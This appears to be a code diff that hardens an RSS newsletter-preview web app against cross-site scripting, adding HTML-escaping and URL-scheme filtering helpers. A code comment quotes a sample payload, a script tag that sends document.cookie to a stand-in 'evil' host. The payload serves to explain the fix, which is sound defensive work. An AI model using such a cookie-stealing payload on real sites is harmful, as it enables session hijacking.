@@ -1257,6 +1257,33 @@
       //   1. Trailing-dash in title (Google News pattern: "...- WSVN")
       //   2. Domain map for direct sources (re-nj.com → "Real Estate NJ")
       //   3. Strip "Google News " prefix from feed names
+
+      // HTML-escape helpers (mirror src/shared/html-escape.ts). Used by the
+      // 3 newsletter preview builders below. Without these, an RSS title like
+      //   <script>fetch('https://evil/?t='+document.cookie)</script>
+      // would render verbatim into the SPA preview DOM and execute. The SPA
+      // is plain JS in a browser → XSS is real here (not just theoretical
+      // like in the email path where clients sanitize).
+      const HTML_ESCAPE_MAP = {
+        '&': '&amp;', '<': '&lt;', '>': '&gt;',
+        '"': '&quot;', "'": '&#39;', '`': '&#96;', '/': '&#47;'
+      };
+      const escapeHtml = (text) => {
+        if (text === null || text === undefined) return '';
+        return String(text).replace(/[&<>"'`\/]/g, ch => HTML_ESCAPE_MAP[ch] || ch);
+      };
+      const escapeAttr = escapeHtml;
+      const safeUrl = (url) => {
+        if (!url) return '#';
+        const s = String(url).trim();
+        if (!s) return '#';
+        if (/^\s*(javascript|data|vbscript|file):/i.test(s)) return '#';
+        try {
+          const u = new URL(s);
+          return (u.protocol === 'http:' || u.protocol === 'https:') ? s : '#';
+        } catch { return '#'; }
+      };
+
       const PUBLISHER_DOMAIN_MAP = {
         're-nj.com': 'Real Estate NJ', 'roi-nj.com': 'ROI-NJ', 'njbiz.com': 'NJBIZ',
         'realestatenjmag.com': 'Real Estate NJ Magazine', 'njspotlightnews.org': 'NJ Spotlight News', 'nj.com': 'NJ.com',
@@ -2539,25 +2566,25 @@
 
           return `<div class="article-card">
             <div class="article-title-header">
-              <h3 class="article-title">${title}</h3>
+              <h3 class="article-title">${escapeHtml(title)}</h3>
             </div>
             <div class="article-header">
-              <span class="badge badge-location">${region}</span>
-              <span class="badge badge-category">${category.toUpperCase()}</span>
-              <span class="badge badge-source">${source}</span>
+              <span class="badge badge-location">${escapeHtml(region)}</span>
+              <span class="badge badge-category">${escapeHtml(category.toUpperCase())}</span>
+              <span class="badge badge-source">${escapeHtml(source)}</span>
             </div>
             <div class="article-description">
-              <p>${desc}</p>
+              <p>${escapeHtml(desc)}</p>
             </div>
             <div class="article-context">
-              <strong>Why This Relates to Industrial News:</strong> ${whyItMatters}
+              <strong>Why This Relates to Industrial News:</strong> ${escapeHtml(whyItMatters)}
             </div>
             <div class="article-source">
               <div class="source-info">
                 <span class="source-label">Source:</span>
-                <span class="source-name">${source}</span>
+                <span class="source-name">${escapeHtml(source)}</span>
               </div>
-              <a href="${item.link}" class="read-more-btn" target="_blank">Read Full Article →</a>
+              <a href="${escapeAttr(safeUrl(item.link))}" class="read-more-btn" target="_blank" rel="noopener noreferrer">Read Full Article →</a>
             </div>
           </div>`;
         };
@@ -2666,11 +2693,12 @@
           const source = item.source || 'Industry News';
           const desc = buildDescGoth(item);
 
+          const safeHref = safeUrl(url);
           return `<li style="margin-bottom: 16px; padding-bottom: 14px; border-bottom: 1px solid #e8e8e8; list-style: none;">
-            <a href="${url}" style="color: #1e3c72; text-decoration: none; font-weight: 600; font-size: 15px; line-height: 1.4; display: block;">${title}</a>
-            ${desc ? `<p style="margin: 8px 0 0 0; color: #555; font-size: 13px; line-height: 1.5;">${desc}</p>` : ''}
+            <a href="${escapeAttr(safeHref)}" style="color: #1e3c72; text-decoration: none; font-weight: 600; font-size: 15px; line-height: 1.4; display: block;" rel="noopener noreferrer">${escapeHtml(title)}</a>
+            ${desc ? `<p style="margin: 8px 0 0 0; color: #555; font-size: 13px; line-height: 1.5;">${escapeHtml(desc)}</p>` : ''}
             <div style="margin-top: 8px;">
-              <a href="${url}" style="color: #2563eb; text-decoration: none; font-size: 12px;">Read at ${source} →</a>
+              <a href="${escapeAttr(safeHref)}" style="color: #2563eb; text-decoration: none; font-size: 12px;" rel="noopener noreferrer">Read at ${escapeHtml(source)} →</a>
               <span style="font-size: 11px; color: #999; margin-left: 12px;">[Track] [Share] [Ignore]</span>
             </div>
           </li>`;
@@ -2826,9 +2854,17 @@
           const shareBody = encodeURIComponent(`Thought you'd find this relevant:\n\n${title}\n${url}`);
           const shareUrl = `mailto:?subject=${shareSubject}&body=${shareBody}`;
 
+          // Escape RSS-derived fields. dealBadge / paywalled are template-built
+          // (no untrusted data) so they're safe to interpolate raw. Track/Share/
+          // Ignore URLs are constructed from actionUrl (constant) + encoded params
+          // via encodeURIComponent, but still pass through safeUrl/escapeAttr.
+          const safeSourceHref = safeUrl(url);
+          const safeTrackHref = safeUrl(trackUrl);
+          const safeShareHref = /^mailto:/i.test(shareUrl) ? shareUrl : safeUrl(shareUrl);
+          const safeIgnoreHref = safeUrl(ignoreUrl);
           return `<li style="margin-bottom: 14px; line-height: 1.5; color: #333;">
-            ${displayText}${dealBadge} — <a href="${url}" style="color: #2563eb; text-decoration: underline;">${sourceName}</a>${paywalled}
-            <br><span style="font-size: 11px;"><a href="${trackUrl}" style="color: #10b981; text-decoration: none;">[Track]</a> <a href="${shareUrl}" style="color: #6366f1; text-decoration: none;">[Share]</a> <a href="${ignoreUrl}" style="color: #dc2626; text-decoration: none;">[Ignore]</a></span>
+            ${escapeHtml(displayText)}${dealBadge} — <a href="${escapeAttr(safeSourceHref)}" style="color: #2563eb; text-decoration: underline;" rel="noopener noreferrer">${escapeHtml(sourceName)}</a>${paywalled}
+            <br><span style="font-size: 11px;"><a href="${escapeAttr(safeTrackHref)}" style="color: #10b981; text-decoration: none;">[Track]</a> <a href="${escapeAttr(safeShareHref)}" style="color: #6366f1; text-decoration: none;">[Share]</a> <a href="${escapeAttr(safeIgnoreHref)}" style="color: #dc2626; text-decoration: none;">[Ignore]</a></span>
           </li>`;
         };
 
